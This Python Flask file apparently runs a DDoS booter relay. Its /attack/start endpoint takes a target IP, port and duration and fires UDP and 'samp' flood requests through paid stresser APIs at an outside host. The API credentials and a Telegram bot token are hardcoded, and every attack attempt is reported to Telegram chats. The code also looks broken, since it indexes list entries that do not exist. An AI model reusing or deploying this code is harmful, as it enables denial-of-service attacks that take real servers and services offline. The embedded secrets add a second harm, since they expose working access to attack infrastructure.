# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
import requests
import logging
import time
import threading

app = Flask(__name__)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram Configuration
BOT_TOKEN = "6982857776:AAFDG6KtTz4T6jYjeZiwFdqZgTpqSW8Mj3Y"
CHAT_IDS = ["8523310365", "7646520243"]
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_telegram_message(message):
    for chat_id in CHAT_IDS:
        if chat_id:
            try:
                requests.post(TELEGRAM_API_URL, data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'}, timeout=5)
            except:
                pass

# ==================== TARGET APIS ====================
TARGET_APIS = [
    {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    
    
    {"id": 3, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    {"id": 5, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
    
]

def is_api_available(api):
    if api['busy'] and time.time() < api.get('busy_until', 0):
        return False
    return True

def mark_busy(api, duration):
    api['busy'] = True
    api['busy_until'] = time.time() + duration + 10

def mark_free(api):
    api['busy'] = False
    api['busy_until'] = 0

def get_response_summary(response, response_time):
    summary = f"Status: {response.status_code} | Time: {response_time}ms\n"
    try:
        json_data = response.json()
        summary += f"JSON: {json_data}"
    except:
        text = response.text.strip()
        if len(text) > 700:
            text = text[:700] + "... [truncated]"
        summary += f"Response: {text}"
    return summary

def is_attack_successful(response):
    if not response:
        return False
    try:
        data = response.json()
        error = data.get('error')
        message = str(data.get('message', '')).lower()
        if error is False or any(word in message for word in ['launched', 'success', 'started', 'sent', 'attack']):
            return True
        if error is True or any(word in message for word in ['slots full', 'busy', 'full', 'wait', 'limit', 'cooldown', 'fail']):
            return False
    except:
        pass
    return response.status_code == 200

def send_attack_to_api(api, ip, port, duration, packet_len=512):
    method = "samp" if api["type"] == "old" else "udp"
    max_retries = 8
    retry_count = 0
    success_time = None

    while retry_count < max_retries:
        attempt = retry_count + 1
        start_time = time.time()
        
        try:
            if api["type"] == "old":
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
            else:
                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration, len=packet_len)

            response = requests.get(target_url, timeout=25)
            response_time = int((time.time() - start_time) * 1000)
            
            send_telegram_message(f"""
🔵 <b>ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
├ Method: {method.upper()}
├ Target: {ip}:{port}
├ Duration: {duration}s
├ Status: {response.status_code}
└ Response:
{get_response_summary(response, response_time)}
""")

            if is_attack_successful(response):
                success_time = time.time()
                send_telegram_message(f"""
✅ <b>ATTACK STARTED SUCCESSFULLY</b> | {api['name']}
├ Method: {method.upper()} 
├ Target: {ip}:{port}
├ Attempt: {attempt}
├ Started After: {attempt-1} failed attempts
""")
                return True, success_time

            retry_count += 1
            if retry_count < max_retries:
                time.sleep(2)

        except Exception as e:
            retry_count += 1
            send_telegram_message(f"⚠️ Error on {api['name']} (Attempt {attempt}): {str(e)[:150]}")
            if retry_count < max_retries:
                time.sleep(min(2 ** retry_count, 10))

    send_telegram_message(f"💀 All retries failed on {api['name']}")
    return False, None

def execute_attack(old_api, new_api, ip, port, total_time, packet_len=512):
    selected = [old_api, new_api]
    
    # Mark busy immediately
    for api in selected:
        mark_busy(api, total_time)
        send_telegram_message(f"🚀 LAUNCHING → {api['name']} | {ip}:{port} ({total_time}s)")

    # Run both in parallel
    threads = []
    results = []
    
    for api in selected:
        t = threading.Thread(target=lambda a=api: results.append(send_attack_to_api(a, ip, port, total_time, packet_len)), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Wait full requested duration from when attack actually started
    send_telegram_message(f"⏳ Waiting full attack duration ({total_time}s) for both APIs...")
    time.sleep(total_time)

    # Release both slots
    for api in selected:
        mark_free(api)
        send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")

    send_telegram_message(f"✅ Pair Attack Cycle Completed → {ip}:{port}")

@app.route('/attack/start', methods=['GET'])
def start_attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time')
    packet_len = request.args.get('len', 512)

    if not all([ip, port, time_param]):
        return jsonify({'error': 'Missing parameters'}), 400

    try:
        port = int(port)
        total_time = int(time_param)
        packet_len = int(packet_len)
        if total_time <= 0 or total_time > 3600:
            raise ValueError
    except:
        return jsonify({'error': 'Invalid parameters'}), 400

    # Find available pair
    for i in range(5):
        old_api = TARGET_APIS[i]
        new_api = TARGET_APIS[i + 5]
        
        if is_api_available(old_api) and is_api_available(new_api):
            threading.Thread(
                target=execute_attack,
                args=(old_api, new_api, ip, port, total_time, packet_len),
                daemon=True
            ).start()
            
            return jsonify({
                'success': True,
                'pair': f"{old_api['name']} + {new_api['name']}",
                'target': f'{ip}:{port}',
                'time': total_time
            })

    return jsonify({'error': 'All API pairs are busy'}), 503

@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'free_pairs': [f"Pair {i+1} ({TARGET_APIS[i]['name']}+{TARGET_APIS[i+5]['name']})" 
                      for i in range(5) if is_api_available(TARGET_APIS[i]) and is_api_available(TARGET_APIS[i+5])],
        'busy_apis': [api['name'] for api in TARGET_APIS if api['busy']]
    })

if __name__ == '__main__':
    print("="*100)
    print("🚀 IMPROVED PAIRED SYSTEM")
    print("→ Retries work properly")
    print("→ Busy timer starts from successful launch")
    print("→ Both slots released only after full duration")
    print("="*100)
    app.run(host='0.0.0.0', port=8080, threaded=True)
